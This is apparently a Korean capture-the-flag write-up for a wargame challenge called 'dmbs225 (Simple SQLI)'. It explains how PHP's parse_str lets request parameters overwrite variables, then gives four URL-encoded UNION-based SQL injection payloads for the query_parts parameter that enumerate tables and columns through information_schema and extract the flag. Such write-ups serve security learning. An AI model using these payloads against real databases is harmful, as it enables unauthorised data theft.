# dmbs225(Simple SQLI)

1. view-source를 눌러 확인한다.
2. php코드를 보니 parse_str함수가 존재한다.
이는 인자값으로 넘어온 모든 값을 변수로 바꾸기에
매우 취약한 함수이다.
3. 이를 통해 query_parts에 SQLI를 이용해 공격한다.<br>

```css
1. search_cols=zzz&keyword=&operator=or&query_parts=subject%20union%20select%201,2,3,4
위 과정을 통해 SQLI의 유효성을 확인한다.

2. search_cols=zzz&keyword=&operator=or&query_parts=subject%20union%20select%201,2,table_name,4%20from%20information_schema.tables#
위 과정을 통해 flag가 있어보이는 테이블을 찾는다.

3. search_cols=zzz&keyword=&operator=or&query_parts=subject%20union%20select%201,2,column_name,4%20from%20information_schema.columns%20where%20table_name='flag테이블'#
위 과정을 통해 flag가 있는 테이블의 컬럼들을 확인한다.

4. search_cols=zzz&keyword=&operator=or&query_parts=subject%20union%20select%201,2,flag컬럼,4%20from%20flag테이블#
위 과정을 통해 flag값을 얻어낼 수 있다.
```